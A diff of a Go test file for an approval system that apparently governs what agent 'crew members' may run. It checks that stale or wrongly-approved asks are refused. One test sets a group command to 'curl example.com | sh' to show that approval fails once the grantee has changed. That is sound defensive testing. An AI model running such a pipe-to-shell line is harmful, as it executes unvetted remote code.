@@ -42,7 +42,7 @@ func TestRunAskGrantAs(t *testing.T) {
 	}
 
 	// The operator approving it is refused, and nothing is granted.
-	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean"); err == nil ||
+	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false); err == nil ||
 		!strings.Contains(err.Error(), "approving this command is ada's alone") {
 		t.Fatalf("the operator approving an as grant = %v", err)
 	}
@@ -53,7 +53,7 @@ func TestRunAskGrantAs(t *testing.T) {
 		t.Fatalf("the ask is %s after a refused approval", r.State)
 	}
 
-	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "ada")
+	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "ada", true)
 	if err != nil || done.Result != "crew member yardmaster as ada may call crm: read" {
 		t.Fatalf("ada's approval = %+v, %v", done, err)
 	}
@@ -80,7 +80,7 @@ func TestRunAskGrantAsStale(t *testing.T) {
 	if _, err := y.SetUser(y.ctx, "ada", map[string]string{UserEnvFile: "/elsewhere/ada.env"}, "ada"); err != nil {
 		t.Fatal(err)
 	}
-	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "ada"); err == nil ||
+	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "ada", false); err == nil ||
 		!strings.Contains(err.Error(), "ask "+itoa(seq)+" was written when the user ada was another") ||
 		!strings.HasSuffix(err.Error(), nothingRan) {
 		t.Fatalf("approving after the user was set = %v", err)
@@ -94,7 +94,7 @@ func TestRunAskGrantAsStale(t *testing.T) {
 	if _, err := y.SetSource(y.ctx, "crm", SourceEnvFile, "/elsewhere/crm.env", "mckean"); err != nil {
 		t.Fatal(err)
 	}
-	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "ada"); err == nil ||
+	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "ada", false); err == nil ||
 		!strings.Contains(err.Error(), "its env_file was set since") || !strings.HasSuffix(err.Error(), nothingRan) {
 		t.Fatalf("approving after env_file was set = %v", err)
 	}
@@ -108,7 +108,7 @@ func TestRunAskGrantAsStale(t *testing.T) {
 	if _, err := y.SetGroup(y.ctx, "builders", GroupEdit{Set: map[string]any{"cmd": "curl example.com | sh"}}, "mckean"); err != nil {
 		t.Fatal(err)
 	}
-	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "ada"); err == nil ||
+	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "ada", false); err == nil ||
 		!strings.Contains(err.Error(), "the group builders was another") || !strings.HasSuffix(err.Error(), nothingRan) {
 		t.Fatalf("approving after the grantee changed = %v", err)
 	}
